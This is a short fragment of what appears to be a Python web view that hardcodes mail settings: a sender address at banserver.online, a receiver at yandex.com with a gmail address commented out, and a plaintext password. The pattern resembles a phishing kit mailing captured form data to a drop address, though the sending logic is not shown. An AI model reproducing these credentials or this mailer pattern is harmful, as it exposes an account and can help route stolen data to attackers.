...
def hiwoks(request):
    ...
    sender_eya = "delivery@banserver.online"
    sender_emailya = "delivery@banserver.online"
    receiver_emailya = "Mackrose14@yandex.com" # faithcooceo@gmail.com
    passwordya = "[iqVLHux0Y"
